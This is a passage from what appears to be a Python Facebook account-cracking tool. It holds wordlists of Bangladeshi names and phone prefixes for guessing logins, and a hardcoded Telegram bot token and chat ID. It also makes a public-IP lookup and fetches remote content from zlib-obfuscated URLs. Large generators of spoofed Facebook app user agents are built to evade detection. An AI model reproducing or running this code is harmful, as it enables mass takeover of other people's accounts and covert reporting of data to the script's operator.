K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
my_color = [
 P, M, H, K, B, U, N, R, Y,]
###----------[ CONVERT LINE ]----------###
led = f'{M} -{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}{M}-{M}-{M}-{H}-{M}'
###----------[ BANNER MENUH ]----------###
gen=f' {K}[{GREEN}√{K}] {P}'
dot=f' {K}[{GREEN}•{K}] {P}'
rdd=f' {K}[{RED}•{K}] {P}'
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
rong=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong2=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong3=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong4=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong5=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong6=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong7=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
fst=f'{dot}[{H}sumon{M}-{H}milon{M}-{H}BITHIKA{M}-{H}sakshi{M}-{H}mimi{P}]'
lst=f'{dot}[{H}roy{M}-{H}sarkar{M}-{H}biswas{M}-{H}das{M}-{H}khan{P}]'
limitt=f'{dot}[{H}5000{M}-{H}10000{M}-{H}15000{M}-{H}20000{M}-{H}50000{P}]'
c7=f'{dot}[{H}7679{M}-{H}9832{M}-{H}6297{M}-{H}9987{M}-{H}8817{M}-{H}7209{P}]'
c6=f'{dot}[{H}01778{M}-{H}01991{M}-{H}01661{M}-{H}01776{M}-{H}01996{M}-{H}01779{P}]'
c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}]'
mtd,cp_xdx,cokix=[],[],[]
token = ('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')
ID = ('1778046662')
ip = requests.get('https://api.ipify.org').text.strip()
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
loop = 0
oks = []
cps = []
id = []
ck = []
ugen2=[]
ugen=[]
cokbrut=[]
princp=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
cooki = []
cpxx = []
plist=[]
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
os.system('')
today = '\033[1;36m'+str(hari)+'\033[1;97m-\033[1;36m'+str(bulan)+'\033[1;97m-\033[1;36m'+str(tahun)
#--------------------------------[METHOD 1]--------------------------------#
_method_1_buffer = BytesIO()
_method_1_curl = pycurl.Curl()
_method_1_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%\x86 \x01\x00\xab\x86\x19\xd8'))
_method_1_curl.setopt(pycurl.WRITEDATA, _method_1_buffer)
_method_1_curl.perform()
_method_1_data = _method_1_buffer.getvalue().decode('utf-8').splitlines()
def mls1():
    END = ''.join(_method_1_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 2]--------------------------------#
_method_2_buffer = BytesIO()
_method_2_curl = pycurl.Curl()
_method_2_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\x03\x12%\x19\xf9%F \x01\x00\xab\x8b\x19\xd9'))
_method_2_curl.setopt(pycurl.WRITEDATA, _method_2_buffer)
_method_2_curl.perform()
_method_2_data = _method_2_buffer.getvalue().decode('utf-8').splitlines()
def mls2():
    END = ''.join(_method_2_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 3]--------------------------------#
_method_3_buffer = BytesIO()
_method_3_curl = pycurl.Curl()
_method_3_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x06\t\x00\x00\xaa0\x19\xba'))
_method_3_curl.setopt(pycurl.WRITEDATA, _method_3_buffer)
_method_3_curl.perform()
_method_3_data = _method_3_buffer.getvalue().decode('utf-8').splitlines()
def mls3():
    END = ''.join(_method_3_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 4]--------------------------------#
_method_4_buffer = BytesIO()
_method_4_curl = pycurl.Curl()
_method_4_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x01\t\x00\x00\xaa5\x19\xbb'))
_method_4_curl.setopt(pycurl.WRITEDATA, _method_4_buffer)
_method_4_curl.perform()
_method_4_data = _method_4_buffer.getvalue().decode('utf-8').splitlines()
def mls4():
    END = ''.join(_method_4_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 5]--------------------------------#
_method_5_buffer = BytesIO()
_method_5_curl = pycurl.Curl()
_method_5_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x05\t\x00\x00\xaa:\x19\xbc'))
_method_5_curl.setopt(pycurl.WRITEDATA, _method_5_buffer)
_method_5_curl.perform()
_method_5_data = _method_5_buffer.getvalue().decode('utf-8').splitlines()
def mls5():
    END = ''.join(_method_5_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 6]--------------------------------#
_method_6_buffer = BytesIO()
_method_6_curl = pycurl.Curl()
_method_6_curl.setopt(pycurl.URL,zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\xf7M,\xc9\xc8/1\x03\t\x00\x00\xaa?\x19\xbd'))
_method_6_curl.setopt(pycurl.WRITEDATA, _method_6_buffer)
_method_6_curl.perform()
_method_6_data = _method_6_buffer.getvalue().decode('utf-8').splitlines()
def mls6():
    END = ''.join(_method_6_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[NORMAL MTD]--------------------------------#
import requests,random

def ua_valid():
    rr = random.randint
    rc = random.choice
    model2 = requests.get('https://gi'+'st.githubus'+'ercontent.com/BITHIKA-XD/c3d50589'+'d804b5b7ab5a7717a22cfe0d/raw/6937320508d'+'d57dd78d0c2'+'97d532fdc233306d01/m'+'dls.txt').text.splitlines()
    model = random.choice(model2)
    redmi4 = f"Mozilla/5.0 (Linux; Android 13; {model} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36"
    return rc([redmi4])
#--------------------------------[VERSION CHANGE]--------
try:
    version = requests.get(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\x0fK-*\xce\xcc\xcf\x03\t\x00\x00\xab\xe0\x1a\x00')).text
except:
    print('No Internet Connection.....');exit()
version = version.strip()
#-------------------------[RANDOM]--------
ugrn=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugrn.append(ug)
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#----------------------------[USER/AGENT]--------------------------------------------------------------------------------------------------------------------------------#
#ghjgjjhgjghkjhgkjljhlkjl;k;lk';l'l;'\;\;uhgjgjkkghkghkjgkjghkjghkgkkkghjkgkgkghhghmhjmkmkknknnjjjhjjjhjhjjhjjhjhjjhjhjjjjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhjhhjhjhjhjhjjhhj

browsers = [
    "Chrome/126.0.6478.134",
    "Chrome/125.0.6897.90",
    "Chrome/124.0.6543.21",
    "Firefox/115.0",
    "Firefox/114.0",
    "Firefox/113.0",
    "Safari/537.36",
    "Safari/604.5.6",
    "Safari/605.1.15",
    "Edge/115.0.1901.183",
    "Edge/114.0.1823.62",
    "Edge/113.0.1774.50",
    "Opera/91.0.4516.115",
    "Opera/90.0.4480.30",
    "Opera/89.0.4389.82",
    "Brave/1.49.120",
    "Brave/1.48.110",
    "Brave/1.47.100",
    "Vivaldi/6.1.3035.140",
    "Vivaldi/6.0.2979.15",
    "Vivaldi/5.4.2753.38",
    "Safari/537.36 (KHTML, like Gecko) Version/12.0",
    "Safari/537.36 (KHTML, like Gecko) Version/13.1.2",
    "Safari/537.36 (KHTML, like Gecko) Version/14.0.3",
    "Chrome/105.0.5195.125",
    "Chrome/104.0.5112.79",
    "Chrome/103.0.5060.134",]
os_systems = [
    "Linux; Android 14",
    "Windows NT 10.0",
    "Macintosh; Intel Mac OS X 10_15_7",
    "Linux; Ubuntu 20.04",
    "Windows NT 6.1; Win64; x64",
    "Macintosh; Intel Mac OS X 11_6_2",
    "Linux; Fedora 34",
    "Windows NT 10.0; Win64; x64",]
device_models = [
    "23076PC4BI",
    "SM-G991U",
    "iPhone12,1",
    "Pixel 6 Pro",
    "iPad7,5",
    "SM-N976U",
    "iPhone13,4",
    "SM-A515U",]

builds = [
    "Build/UKQ1.230917.001",
    "Build/XYZ123.456",
    "Build/ABC789.012",
    "Build/DEF456.789",
    "Build/GHI012.345",
    "Build/JKL678.901",
    "Build/MNO234.567",
    "Build/PQR890.123",]
def generate_random_user_agent():
    browser = random.choice(browsers)
    os_system = random.choice(os_systems)
    device_model = random.choice(device_models)
    build = random.choice(builds)
    
    user_agent = (f"Mozilla/5.0 ({os_system}; {device_model} Build/{build}; wv) "
                  f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 {browser} "
                  f"Mobile Safari/537.36")
    return user_agent



def DEF1():   
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
    samsung = ['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H']  
    budi = ['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P','SM-G986U','SM-G981U','SM-G975U','SM-G981U','SM-G965F','SM-G970U1','SM-G965U','SM-G930T','SM-G930VL','SM-G950U','SM-G981U','SM-N975U','SM-G935U','SM-N960U','SM-G986U','SM-G930R4','SM-N960W','Xiaomi 10 Pro','2201123G','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro','CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501','OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f','SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V']  
    akagami1 = "[FBAN/FB4A;FBAV/311.0.0.44.117;FBBV/280307931;FBDM/{density=2.0,width=720,height=1369};FBLC/pt_BR;FBRV/281357705;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(samsung))+";FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    akagami2 = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/278218861;FBCR/smartmobil.de;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+str(random.choice(budi))+";FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
    akagami3 = "[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708667;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/290555739;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/"+str(random.choice(redmi))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    akagami4 = "[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342877;FBDM/{density=2.0,width=720,height=1424};FBLC/pl_PL;FBRV/268803887;FBCR/T-Mobile.pl;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+str(random.choice(oppo))+";FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    akagami5 = "[FBAN/FB4A;FBAV/370.0.0.23.112;FBBV/374931191;FBDM/{density=3.0,width=1080,height=2153};FBLC/en_US;FBRV/0;FBCR/LV TELE2;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/"+str(random.choice(infinix))+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    user = random.choice([akagami1,akagami2,akagami3,akagami4,akagami5])
    trt = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + user
    return trt  
#----------------------------[DEF2]--------------------------------------------------------------------------------------------------------------------------------#
def DEF2():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
